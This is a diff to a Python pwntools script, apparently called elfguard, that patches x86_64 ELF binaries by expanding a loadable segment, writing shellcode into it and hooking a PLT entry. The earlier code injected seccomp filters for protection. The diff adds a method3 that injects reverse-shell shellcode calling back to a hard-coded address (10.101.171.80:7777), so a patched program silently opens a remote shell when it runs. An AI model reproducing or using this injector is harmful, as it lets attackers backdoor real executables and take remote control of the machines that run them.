@@ -5,35 +5,54 @@
 
 
 import shutil
-from pwn import *
 import os
 import sys
-import util
+from pwn import *
+from lib import util
+from shellcode.reverseshell import injectshellcode
 
 
-context.log_level = 'info'
+def expandSegment(filename):
+	"""
+	expand PT_LOAD segment(R-X): p_filesz, p_memsz
+	:param filename:
+	:return:
+	"""
+	log.info("="*0x10 + "expand segment" + "="*0x10)
 
+	# get e_phoff e_phnum e_phentsize from ELF header
+	elf = ELF(filename, checksec=False)
+	raw_filesize = os.path.getsize(filename)
+	e_phoff = elf.header.e_phoff                # Elf64_Ehdr->e_phoff       /* Program header table file offset */
+	e_phnum = elf.header.e_phnum                # Elf64_Ehdr->e_phnum       /* Program header table entry count */
+	e_phentsize = elf.header.e_phentsize        # Elf64_Ehdr0>e_phentsize   /* Program header table entry size */
+	log.debug("raw filesize %s" % hex(raw_filesize))
+	log.debug("e_phoff: " + hex(e_phoff) + " e_phnum: " + hex(e_phnum) + " e_phentsize: " + hex(e_phentsize))
 
-def showMenu(usage):
-	menu = '''
-    ______ __     ______ ______                         __
-   / ____// /    / ____// ____/__  __ ____ _ _____ ____/ /
-  / __/  / /    / /_   / / __ / / / // __ `// ___// __  / 
- / /___ / /___ / __/  / /_/ // /_/ // /_/ // /   / /_/ /  
-/_____//_____//_/     \____/ \__,_/ \__,_//_/    \__,_/                                
-								[thinkycx@gmail.com]						
-	'''
-	menu_usage = 'Usage:  python elfguard.py <FILENAME>'
-	if usage == 1:
-		menu += menu_usage
+	with open(filename, 'rb+') as fd:
+		# update program header table in the original position the end and update Elf64_Ehdr->e_phoff
+		log.info("[1] update p_filesz, pmemsz in PT_LOA(1) R_X")
 
-	log.info(menu)
+		fd.seek(e_phoff, 0)                        # mov fd to Elf64_Ehdr->e_phoff
+		phdr_table = fd.read(e_phnum*e_phentsize)  # read program header table value
+		phdr = [phdr_table[i*e_phentsize:i*e_phentsize+e_phentsize] for i in range(e_phnum)]    # get phdr list
+		for i in range(len(phdr)):
+			if u32(phdr[i][0:4]) == 0x1:
+				tmp = phdr[i]
+				tmp = util.replaceStr(tmp, 0x20, p64(raw_filesize+0x1000))     # p_filesz
+				tmp = util.replaceStr(tmp, 0x28, p64(raw_filesize+0x1000))     # p_memsz
+				phdr[i] = tmp	
+				break
+		new_phdr = ''.join(phdr)
+		fd.seek(e_phoff, 0)                        # mov fd to Elf64_Ehdr->e_phoff
+		fd.write(new_phdr)
 
 
 def addSegment(filename):
 	"""
-	add a PT_LOAD segment entry in filename's PHDR
-	the segment will load the new PHDR and shellcode in future
+	create a new PHDR table at the end of the filename
+	add a new PT_LOAD segment(R-X) after the original PT_LOAD segment(R-X)
+	the new segment will load from: (0x400000 + raw_filesize) & -0x1000
 	:param filename:
 	:return:
 	"""
@@ -82,7 +101,7 @@ def addSegment(filename):
 		for i in range(len(phdr)):
 			# update the first entry in PHDR( load the new Program Header Table)
 			if u32(phdr[i][0:4]) == 0x6:
-				log.info("\t find PT_PHDR, going to fix it...")								 
+				log.info("\t find PT_PHDR, going to update it...")								 
 				tmp = phdr[i]
 				tmp = util.replaceStr(tmp, 0x08, p64(raw_filesize))                          # p_offset
 				tmp = util.replaceStr(tmp, 0x10, p64(0x400000 + raw_filesize))               # p_pvaddr
@@ -114,9 +133,9 @@ def addSegment(filename):
 		fd.write(new_phdr_table)
 
 
-def generateShellcode(elf, func_name, shellcode_vaddr):
+def generateShellcode(elf, func_name, execute_shellcode, shellcode_vaddr):
 	"""
-	generate SECCOMP shellcode : contidion + seccomp + func_plt0
+	generate shellcode : contidion + execute_shellcode + func_plt0
 	shellcode is  related to shellcode_vaddr & func_name @ GOT addr
 	:param elf:
 	:param func_name:
@@ -135,8 +154,10 @@ def generateShellcode(elf, func_name, shellcode_vaddr):
 
 	# 1 asm(plt_hook_condition + seccomp)
 	shellcode = util.plt_hook_condition % (func_got_addr, func_plt_addr + 6)   # check GOT ?= plt+6
-	shellcode += util.shellcode_seccomp
-	shellcode_asm = asm(shellcode.replace('\n', ''), arch='amd64')
+	# add shellcode
+	shellcode += execute_shellcode
+	
+	shellcode_asm = asm(shellcode, vma=shellcode_vaddr, arch='amd64')
 
 	# 2 new_plt
 	new_plt_vaddr = shellcode_vaddr + 8 + len(shellcode_asm)                   # shellcode_vaddr + shellcode
@@ -153,18 +174,19 @@ def generateShellcode(elf, func_name, shellcode_vaddr):
 
 
 
-def writeShellcode(filename, shellcode, shellcode_offset):
+def writeShellcode(filename, offset, shellcode):
 	"""
 	write shellcode to the filename
 	:param filename:
+	:param offset:
 	:param shellcode:
-	:param shellcode_offset:
 	:return:
 	"""
-	log.info("="*0x10 + 'write shellcode' + "="*0x10)
+	# log.info("="*0x10 + 'write shellcode' + "="*0x10)
+	log.info("write shellcode")
 
 	with open(filename, 'rb+') as fd:
-		fd.seek(shellcode_offset, 0)
+		fd.seek(offset, 0)
 		fd.write(shellcode)
 
 
@@ -221,9 +243,9 @@ def method1(filename):
 	# print "func_name", [i for i in elf.plt]
 	# func_name = 'fopen'
 	# Notice that, some programs don't have a lazy binding. 20191210
-	shellcode = generateShellcode(elf, func_name, shellcode_base)
+	shellcode = generateShellcode(elf, func_name, util.shellcode_seccomp, shellcode_base)
 	shellcode_offset = elf.vaddr_to_offset(shellcode_base)
-	writeShellcode(filename_protected, shellcode, shellcode_offset)
+	writeShellcode(filename_protected, shellcode_offset, shellcode)
 
 	# 3 last plt hook . If plt is not the last, elf cannot find elf.plt[func_name]
 	pltHook(elf, func_name, shellcode_base)
@@ -252,10 +274,10 @@ def method2(filename):
 
 	# [1] start to generate and write shellcode
 	func_name = [i for i in elf.plt][0]
-	shellcode = generateShellcode(elf, func_name, eh_frame_hdr_addr)
+	shellcode = generateShellcode(elf, func_name, util.shellcode_seccomp, eh_frame_hdr_addr)
 	shellcode_offset = elf.vaddr_to_offset(eh_frame_hdr_addr)
 
-	writeShellcode(eh_frame_filename, shellcode, shellcode_offset)
+	writeShellcode(eh_frame_filename, shellcode_offset, shellcode)
 
 	# [2] plt hook
 	pltHook(elf, func_name, eh_frame_hdr_addr)
@@ -264,15 +286,54 @@ def method2(filename):
 	log.info("Protected file is %s" % eh_frame_filename)
 
 
-if __name__ == '__main__':
-	context.local(arch='amd64', os='linux')
 
+def method3(filename):
+	'''
+	update the PT_LOAD (R-X) in demo program' PHDR to load the shellcode in the file end
+	debug example:
+		gdb ./heapcreator.expanded_injected --ex "set follow-fork-mode parent" --ex "start" --ex "break *0x4034b0" --ex "c"
+	'''
+	# 1. expand a segment
+	expanded_filename = filename + '.expanded_original'
+	shutil.copyfile(filename, expanded_filename)
+
+	expandSegment(expanded_filename)
+	log.info("\t output filename: %s " % expanded_filename)
+
+	# 2 generate and write shellcode
+	filename_protected = sys.argv[1] + '.expanded_injected'
+	shutil.copyfile(expanded_filename, filename_protected)
+	elf = ELF(filename_protected, checksec=False)
+
+	# shellcode virtual address 					   new Program Header offset         size  *  number
+	# shellcode_base = elf.load_addr + filesize
+	# shellcode base, is there any method to get vaddr from offset?
+	shellcode_base = elf.load_addr + os.path.getsize(expanded_filename)
+	# you should debug to see which func to be hooked
+	func_name = [i for i in elf.plt][0]
+	# Notice that, some programs don't have a lazy binding. 20191210
+	shellcode = generateShellcode(elf, func_name, injectshellcode.getshellcode('10.101.171.80', 7777), shellcode_base)
+	shellcode_offset = elf.vaddr_to_offset(shellcode_base)
+	writeShellcode(filename_protected, shellcode_offset, shellcode)
+
+	# 3 last plt hook . If plt is not the last, elf cannot find elf.plt[func_name]
+	pltHook(elf, func_name, shellcode_base)
+	log.info("="*0x17 + 'enjoy' + "="*0x17)
+	log.info("Protected file is %s" % filename_protected)	
+
+def main():
 	# show menu
-	if len(sys.argv) < 2:
-		showMenu(usage=1)
+	if len(sys.argv) != 2:
+		util.showMenu(usage=1)
 		os._exit(0)
 	else:
-		showMenu(usage=0)
+		util.showMenu(usage=0)
+
+	# set context
+	global context
+	context.local(arch='amd64', os='linux')
+	context.log_level = 'info'
+
 
 	# get filename
 	filename = sys.argv[1]
@@ -285,4 +346,7 @@ if __name__ == '__main__':
 		log.error("Only support linux x86_64 binary now.")
 		os._exit(0)
 
-	method1(filename)
+	method2(filename)
+
+if __name__ == '__main__':
+	main()
